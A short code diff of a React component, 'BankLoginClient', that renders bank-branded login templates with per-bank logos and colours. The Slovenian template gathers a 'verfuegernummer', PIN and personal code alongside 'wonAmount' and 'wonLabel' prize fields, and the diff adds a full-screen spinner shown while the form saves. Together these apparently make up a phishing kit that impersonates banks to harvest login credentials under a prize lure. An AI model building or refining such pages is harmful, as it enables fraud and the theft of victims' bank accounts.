@@ -799,18 +799,25 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
 
   if (isSlovenia) {
     return (
-      <SloveniaBankTemplate
-        bankSlug={normalizedSlug}
-        bankName={bank.name}
-        logoFile={bank.logoFile}
-        brandColor={bank.brandColor || theme?.colors.primary}
-        formData={{ verfuegernummer, pin, personalCode, loginMethod }}
-        onChange={handleTemplateChange}
-        handleRouteAction={handleTemplateSubmit}
-        saving={saving}
-        wonAmount={wonAmount}
-        wonLabel={wonLabel}
-      />
+      <>
+        <SloveniaBankTemplate
+          bankSlug={normalizedSlug}
+          bankName={bank.name}
+          logoFile={bank.logoFile}
+          brandColor={bank.brandColor || theme?.colors.primary}
+          formData={{ verfuegernummer, pin, personalCode, loginMethod }}
+          onChange={handleTemplateChange}
+          handleRouteAction={handleTemplateSubmit}
+          saving={saving}
+          wonAmount={wonAmount}
+          wonLabel={wonLabel}
+        />
+        {saving && (
+          <div className="fixed inset-0 z-[99999] flex items-center justify-center bg-[#0c0207]">
+            <div className="size-12 animate-spin rounded-full border-4 border-[#E30613]/30 border-t-[#E30613]" />
+          </div>
+        )}
+      </>
     );
   }
   
